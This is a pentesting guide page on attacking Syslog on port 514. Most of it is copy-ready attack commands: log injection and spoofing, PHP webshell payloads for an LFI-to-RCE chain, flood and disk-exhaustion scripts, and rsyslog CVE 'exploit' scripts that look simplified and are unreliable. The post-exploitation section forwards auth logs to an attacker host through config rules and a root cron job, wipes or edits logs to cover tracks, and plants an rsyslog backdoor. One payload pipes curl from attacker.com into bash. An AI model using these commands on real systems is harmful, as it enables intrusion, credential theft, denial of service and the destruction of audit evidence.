---
title: Port 514 — Syslog Update
description: Pentesting and enumeration guide for Syslog service running on port 514 (UDP/TCP). Includes reconnaissance, log injection, log poisoning, pivoting, and exploitation techniques.
navigation:
  icon: i-lucide-scroll-text
  title: Port 514 — Syslog Update
---

## Overview

Syslog is a standard logging protocol that runs on **UDP port 514** (default) and sometimes **TCP port 514**. It is used by network devices, servers, firewalls, and applications to send log messages to a centralized syslog server.

::note
Syslog has no built-in authentication or encryption by default, making it a prime target for log injection, information disclosure, spoofing, and pivoting attacks.
::

| Detail       | Value                                      |
| ------------ | ------------------------------------------ |
| **Port**     | 514                                        |
| **Protocol** | UDP (default), TCP (rsyslog/syslog-ng)     |
| **Service**  | Syslog                                     |
| **RFCs**     | RFC 3164 (BSD), RFC 5424 (IETF)            |
| **Variants** | rsyslog, syslog-ng, journald, kiwi syslog  |

::tip
Many administrators expose syslog externally without realizing it. A misconfigured syslog receiver accepting messages from any source is a goldmine for attackers.
::

---

## Enumeration

### Nmap Scanning

Discover syslog services using Nmap. Since syslog primarily uses UDP, always include UDP scans.

```bash [UDP Scan]
nmap -sU -p 514 --open -sV <TARGET_IP>
```

```bash [TCP Scan]
nmap -sT -p 514 --open -sV <TARGET_IP>
```

```bash [Aggressive UDP Scan]
nmap -sU -p 514 -sV -sC -A --open -T4 <TARGET_IP>
```

```bash [Version Detection with Scripts]
nmap -sU -p 514 --script=banner,syslog* -sV <TARGET_IP>
```

```bash [Full Syslog Range Scan]
nmap -sU -sT -p 514,1514,6514 --open -sV <TARGET_IP>
```

::note
Port **1514** is commonly used by OSSEC/Wazuh agents. Port **6514** is syslog over TLS (RFC 5425).
::

### Netcat Banner Grabbing

```bash [UDP Banner Grab]
echo "<14>Test message from pentester" | nc -u -w3 <TARGET_IP> 514
```

```bash [TCP Banner Grab]
nc -nv <TARGET_IP> 514
```

```bash [Listen for Syslog Traffic]
nc -u -l -p 514
```

### Service Fingerprinting

```bash [Determine Syslog Daemon]
nmap -sU -p 514 --script=banner -sV --version-intensity 5 <TARGET_IP>
```

```bash [Probe with Custom Facility]
echo "<134>1 2024-01-01T00:00:00Z test probe - - - Enum test" | nc -u -w2 <TARGET_IP> 514
```

### Masscan Discovery

```bash [Fast UDP Discovery]
masscan <TARGET_RANGE> -pU:514 --rate=1000 --open
```

```bash [Combined TCP and UDP]
masscan <TARGET_RANGE> -pU:514 -pT:514 --rate=5000 --open
```

### Shodan & OSINT

```bash [Shodan CLI]
shodan search "port:514 syslog"
```

```bash [Shodan Specific Country]
shodan search "port:514 syslog country:US"
```

```bash [Censys Search]
censys search "services.port=514 AND services.service_name=SYSLOG"
```

---

## Information Disclosure

### Passive Syslog Capture

If you are on the same network segment, syslog traffic (UDP) can be sniffed since it is unencrypted.

```bash [Tcpdump Capture]
tcpdump -i eth0 udp port 514 -A -nn
```

```bash [Tcpdump Save to File]
tcpdump -i eth0 udp port 514 -w syslog_capture.pcap
```

```bash [Tshark Capture]
tshark -i eth0 -f "udp port 514" -Y "syslog" -T fields -e syslog.msg
```

```bash [Tshark Detailed Output]
tshark -i eth0 -f "udp port 514" -V
```

::warning
Captured syslog messages often contain hostnames, IP addresses, usernames, application names, file paths, error messages, and sometimes even credentials in debug-level logs.
::

### Extracting Sensitive Data from Logs

```bash [Grep for Credentials]
tcpdump -i eth0 udp port 514 -A | grep -iE "pass|pwd|password|secret|key|token|auth"
```

```bash [Grep for Usernames]
tcpdump -i eth0 udp port 514 -A | grep -iE "user|login|uid|account"
```

```bash [Grep for IP Addresses]
tcpdump -i eth0 udp port 514 -A | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
```

```bash [Grep for SSH Events]
tcpdump -i eth0 udp port 514 -A | grep -i "sshd"
```

```bash [Grep for Failed Logins]
tcpdump -i eth0 udp port 514 -A | grep -iE "failed|invalid|denied|rejected"
```

---

## Log Injection

### Syslog Message Format (RFC 3164 — BSD)

::collapsible

```text [BSD Syslog Format]
<PRI>TIMESTAMP HOSTNAME APP-NAME[PID]: MESSAGE

PRI = (Facility × 8) + Severity

Facility values:
  0  = kern      4  = auth       8  = uucp    12 = ntp     16-23 = local0-7
  1  = user      5  = syslog     9  = clock   13 = audit
  2  = mail      6  = lpr       10  = authpriv 14 = alert
  3  = daemon    7  = news      11  = ftp      15 = cron

Severity values:
  0 = Emergency    4 = Warning
  1 = Alert        5 = Notice
  2 = Critical     6 = Informational
  3 = Error        7 = Debug
```

::

### Basic Log Injection

```bash [Simple Injection]
echo "<14>Jan  1 00:00:00 pwned sshd[1337]: Accepted password for root from 10.10.10.10 port 4444 ssh2" | nc -u -w1 <TARGET_IP> 514
```

```bash [Auth Facility Injection]
echo "<38>Jan  1 12:00:00 webserver sshd[9999]: Accepted publickey for admin from 192.168.1.100 port 22 ssh2" | nc -u -w1 <TARGET_IP> 514
```

```bash [Kernel Facility Injection]
echo "<0>Jan  1 12:00:00 firewall kernel: iptables ACCEPT IN=eth0 SRC=10.0.0.1 DST=10.0.0.2" | nc -u -w1 <TARGET_IP> 514
```

### Spoofed Source Host Injection

Inject logs appearing to originate from a different host to create confusion or cover tracks.

```bash [Spoof as Domain Controller]
echo "<86>Jan  1 12:00:00 DC01 msauth[100]: User admin@corp.local authenticated successfully" | nc -u -w1 <TARGET_IP> 514
```

```bash [Spoof as Firewall]
echo "<6>Jan  1 12:00:00 FW-CORE kernel: ALLOW TCP 10.0.0.50:4444 -> 10.0.0.1:443" | nc -u -w1 <TARGET_IP> 514
```

```bash [Spoof as Web Server]
echo "<14>Jan  1 12:00:00 WEBPROD apache2[2048]: 10.0.0.1 - admin [01/Jan/2024:12:00:00] \"GET /admin HTTP/1.1\" 200 1337" | nc -u -w1 <TARGET_IP> 514
```

### Mass Log Injection (Flooding)

```bash [Log Flooding with Loop]
for i in $(seq 1 10000); do echo "<14>Jan  1 00:00:00 flood test[$i]: Noise message $i" | nc -u -w0 <TARGET_IP> 514; done
```

```bash [High-Speed Flooding with hping3]
hping3 --udp -p 514 --data 100 --flood <TARGET_IP>
```

```bash [Python One-Liner Flood]
python3 -c "
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
for i in range(100000):
    s.sendto(b'<14>Jan  1 00:00:00 flood noise[%d]: garbage log entry %d' % (i,i), ('<TARGET_IP>',514))
s.close()
"
```

::caution
Log flooding can cause disk exhaustion, SIEM overload, and denial of service. Use responsibly and only with authorization.
::

---

## Log Poisoning (LFI to RCE Chain)

### Concept

If a web application has a Local File Inclusion (LFI) vulnerability and you can inject PHP/code into syslog files, you can achieve Remote Code Execution.

::steps{level="4"}

#### Identify the Syslog Log File Location

| OS / Distribution | Log File Path                    |
| ----------------- | -------------------------------- |
| Debian / Ubuntu   | `/var/log/syslog`                |
| RHEL / CentOS     | `/var/log/messages`              |
| FreeBSD           | `/var/log/messages`              |
| macOS             | `/var/log/system.log`            |
| Auth logs         | `/var/log/auth.log`              |
| rsyslog custom    | Check `/etc/rsyslog.conf`        |
| syslog-ng custom  | Check `/etc/syslog-ng/syslog-ng.conf` |

#### Inject PHP Payload via Syslog

```bash [PHP Webshell Injection]
echo "<14>Jan  1 00:00:00 target apache2[1337]: <?php system(\$_GET['cmd']); ?>" | nc -u -w1 <TARGET_IP> 514
```

```bash [PHP Eval Injection]
echo "<14>Jan  1 00:00:00 target app[1]: <?php eval(\$_POST['x']); ?>" | nc -u -w1 <TARGET_IP> 514
```

```bash [PHP Base64 Encoded Payload]
echo "<14>Jan  1 00:00:00 target app[1]: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>" | nc -u -w1 <TARGET_IP> 514
```

#### Trigger via LFI

```text [LFI Trigger — Webshell]
http://<TARGET_IP>/vulnerable.php?page=/var/log/syslog&cmd=id
```

```text [LFI Trigger — Auth Log]
http://<TARGET_IP>/vulnerable.php?page=/var/log/auth.log&cmd=whoami
```

```text [LFI with Null Byte (old PHP)]
http://<TARGET_IP>/vulnerable.php?page=/var/log/syslog%00&cmd=cat+/etc/passwd
```

```text [LFI with Path Traversal]
http://<TARGET_IP>/vulnerable.php?page=../../../var/log/syslog&cmd=id
```

::

### SSH Auth Log Poisoning (via Port 514 Relay)

If sshd logs to syslog (which forwards to the target), inject via SSH username field.

```bash [SSH Username Injection]
ssh '<?php system($_GET["cmd"]); ?>'@<TARGET_IP>
```

```bash [Then Trigger via LFI]
curl "http://<TARGET_IP>/vuln.php?page=/var/log/auth.log&cmd=id"
```

---

## Exploitation

### Syslog Daemon Vulnerabilities

::field-group

::field{name="rsyslog CVE-2014-3634" type="RCE"}
rsyslog before 7.6.7 and 8.x before 8.4.2 — crafted syslog PRI value causes heap-based buffer overflow.
::

::field{name="rsyslog CVE-2019-17041" type="Heap Overflow"}
rsyslog contrib module `mmjsonparse` — heap overflow via crafted log message.
::

::field{name="rsyslog CVE-2019-17042" type="Heap Overflow"}
rsyslog contrib module `mmpstrucdata` — heap overflow via crafted log message.
::

::field{name="syslog-ng CVE-2020-8019" type="Privilege Escalation"}
syslog-ng — insecure PID file handling allows local privilege escalation.
::

::field{name="rsyslog CVE-2022-24903" type="Heap Overflow / RCE"}
rsyslog TCP reception module — heap buffer overflow via crafted octet-counted framing.
::

::

### CVE-2014-3634 — rsyslog PRI Overflow

```bash [Exploit Crafted PRI]
python3 -c "
import socket
# PRI value > 191 triggers the bug in vulnerable rsyslog
payload = b'<999>A' * 2048
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(payload, ('<TARGET_IP>', 514))
s.close()
print('[+] Payload sent')
"
```

### CVE-2022-24903 — rsyslog TCP Octet-Counted Overflow

```bash [Exploit Crafted TCP Frame]
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('<TARGET_IP>', 514))
# Octet-counted framing with mismatched length
payload = b'9999999 ' + b'A' * 10000
s.send(payload)
s.close()
print('[+] TCP overflow payload sent')
"
```

::tip
Always check the exact rsyslog/syslog-ng version with `rsyslogd -v` or through Nmap service detection before attempting version-specific exploits.
::

### Searchsploit

```bash [Search for rsyslog Exploits]
searchsploit rsyslog
```

```bash [Search for syslog Exploits]
searchsploit syslog
```

```bash [Search for syslog-ng Exploits]
searchsploit syslog-ng
```

---

## Spoofing & MITM

### UDP Source Spoofing

Since syslog uses UDP (connectionless), source IP spoofing is trivial.

```bash [Scapy Spoofed Syslog]
python3 -c "
from scapy.all import *
pkt = IP(src='<SPOOFED_IP>', dst='<TARGET_IP>') / UDP(sport=514, dport=514) / Raw(load='<14>Jan  1 00:00:00 spoofed sshd[1]: Accepted password for root from 10.10.10.10 port 22')
send(pkt, count=1)
print('[+] Spoofed syslog message sent')
"
```

```bash [hping3 Spoofed Source]
hping3 --udp -p 514 -a <SPOOFED_IP> --data 200 -E payload.txt <TARGET_IP>
```

### Man-in-the-Middle (ARP Poisoning + Syslog Capture)

```bash [ARP Spoof with arpspoof]
arpspoof -i eth0 -t <TARGET_IP> <GATEWAY_IP>
```

```bash [Capture Redirected Syslog]
tcpdump -i eth0 udp port 514 -A -nn | tee syslog_mitm.log
```

```bash [Ettercap MITM]
ettercap -T -q -i eth0 -M arp:remote /<TARGET_IP>// /<SYSLOG_SERVER>//
```

---

## Denial of Service

### UDP Flood

```bash [hping3 UDP Flood]
hping3 --udp -p 514 --flood --rand-source <TARGET_IP>
```

```bash [Nping UDP Flood]
nping --udp -p 514 --rate 10000 -c 100000 <TARGET_IP>
```

### Disk Exhaustion via Log Injection

```bash [Large Message Injection]
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
msg = '<14>Jan  1 00:00:00 evil app[1]: ' + 'A' * 1024
for i in range(1000000):
    s.sendto(msg.encode(), ('<TARGET_IP>', 514))
s.close()
print('[+] Disk exhaustion attack completed')
"
```

::caution
Disk exhaustion attacks can bring down production systems entirely. Only perform with explicit written authorization.
::

---

## Post-Exploitation

### Redirecting Syslog to Attacker

After gaining access to a target, redirect its syslog output to your listener.

```bash [Add Forwarding Rule — rsyslog]
echo "*.* @<ATTACKER_IP>:514" >> /etc/rsyslog.conf && systemctl restart rsyslog
```

```bash [Add Forwarding Rule — syslog-ng]
echo 'destination d_attacker { udp("<ATTACKER_IP>" port(514)); }; log { source(s_src); destination(d_attacker); };' >> /etc/syslog-ng/syslog-ng.conf && systemctl restart syslog-ng
```

```bash [Listen on Attacker]
nc -u -l -p 514 | tee captured_logs.txt
```

### Covering Tracks via Log Manipulation

```bash [Clear Syslog]
echo "" > /var/log/syslog
```

```bash [Remove Specific Entries]
sed -i '/<ATTACKER_IP>/d' /var/log/syslog
```

```bash [Remove Auth Log Entries]
sed -i '/Failed password.*<ATTACKER_IP>/d' /var/log/auth.log
```

```bash [Clear Journal Logs]
journalctl --rotate && journalctl --vacuum-time=1s
```

```bash [Tamper Timestamps]
touch -t 202401010000 /var/log/syslog
```

### Persistence via Syslog

```bash [Cron-Based Log Exfiltration]
echo "*/5 * * * * tail -n 100 /var/log/auth.log | nc -u -w1 <ATTACKER_IP> 514" >> /var/spool/cron/crontabs/root
```

```bash [rsyslog Config Backdoor]
echo 'if $msg contains "BACKDOOR_TRIGGER" then ^/tmp/backdoor.sh' >> /etc/rsyslog.conf
```

---

## Syslog over TLS (Port 6514)

### Enumeration

```bash [Nmap TLS Syslog Scan]
nmap -sT -p 6514 --open -sV --script=ssl-cert,ssl-enum-ciphers <TARGET_IP>
```

```bash [OpenSSL Connect]
openssl s_client -connect <TARGET_IP>:6514
```

```bash [Test Certificate]
openssl s_client -connect <TARGET_IP>:6514 -showcerts 2>/dev/null | openssl x509 -noout -text
```

### Inject via TLS

```bash [TLS Syslog Injection]
echo "<14>1 2024-01-01T00:00:00Z evil app - - - Test injection over TLS" | openssl s_client -connect <TARGET_IP>:6514 -quiet
```

---

## Useful Payloads

### PHP Log Poisoning Payloads

```php [Simple Webshell]
<?php system($_GET['cmd']); ?>
```

```php [Eval Shell]
<?php eval($_POST['x']); ?>
```

```php [Base64 Decoder]
<?php eval(base64_decode($_REQUEST['b'])); ?>
```

```php [Passthru Variant]
<?php passthru($_GET['cmd']); ?>
```

```php [Shell Exec Variant]
<?php echo shell_exec($_GET['cmd']); ?>
```

### Syslog PRI Payloads

```text [Auth Success Fake]
<38>Jan  1 12:00:00 target sshd[9999]: Accepted password for root from 10.10.10.10 port 22 ssh2
```

```text [Cron Fake]
<78>Jan  1 12:00:00 target CRON[1234]: (root) CMD (/usr/bin/curl http://attacker.com/shell.sh | bash)
```

```text [Sudo Fake]
<86>Jan  1 12:00:00 target sudo[5678]: admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
```

```text [Kernel Panic Fake]
<0>Jan  1 12:00:00 target kernel: Kernel panic - not syncing: Attempted to kill init!
```

---

## Tool Resources

::card-group

::card
---
title: rsyslog
icon: i-simple-icons-github
to: https://github.com/rsyslog/rsyslog
target: _blank
---
The most widely used syslog daemon on Linux. Understanding its configuration is essential for log injection and poisoning attacks.
::

::card
---
title: Scapy
icon: i-simple-icons-python
to: https://scapy.net
target: _blank
---
Powerful packet manipulation library for crafting spoofed syslog packets and custom protocol attacks.
::

::card
---
title: Nmap
icon: i-simple-icons-github
to: https://nmap.org
target: _blank
---
Network scanner for discovering and fingerprinting syslog services on UDP and TCP port 514.
::

::card
---
title: hping3
icon: i-simple-icons-linux
to: http://www.hping.org
target: _blank
---
TCP/UDP packet assembler and analyzer. Useful for syslog flooding and source spoofing attacks.
::

::card
---
title: Logstash / Elastic
icon: i-simple-icons-elastic
to: https://www.elastic.co/logstash
target: _blank
---
Often used alongside syslog. Misconfigurations in the ELK stack can expand the attack surface.
::

::card
---
title: syslog-ng
icon: i-simple-icons-github
to: https://github.com/syslog-ng/syslog-ng
target: _blank
---
Alternative syslog daemon. Review its configuration syntax for post-exploitation persistence.
::

::

---

## Cheat Sheet

| Action                       | Command                                                                                 |
| ---------------------------- | --------------------------------------------------------------------------------------- |
| UDP scan                     | `nmap -sU -p 514 --open -sV <IP>`                                                      |
| TCP scan                     | `nmap -sT -p 514 --open -sV <IP>`                                                      |
| Banner grab                  | `echo "<14>test" \| nc -u -w3 <IP> 514`                                                |
| Sniff syslog                 | `tcpdump -i eth0 udp port 514 -A`                                                      |
| Inject fake log              | `echo "<38>... sshd: Accepted password for root..." \| nc -u -w1 <IP> 514`             |
| PHP log poison               | `echo "<14>... <?php system(\$_GET['cmd']); ?>" \| nc -u -w1 <IP> 514`                 |
| Spoof source IP              | `scapy: send(IP(src='FAKE',dst='TGT')/UDP(dport=514)/Raw(load='...'))`                 |
| Flood                        | `hping3 --udp -p 514 --flood --rand-source <IP>`                                       |
| Redirect logs to attacker    | `echo "*.* @<ATTACKER>:514" >> /etc/rsyslog.conf`                                      |
| TLS syslog enum              | `nmap -sT -p 6514 --script=ssl-cert <IP>`                                              |
| Searchsploit                 | `searchsploit rsyslog`                                                                  |
| Clear logs                   | `echo "" > /var/log/syslog`                                                             |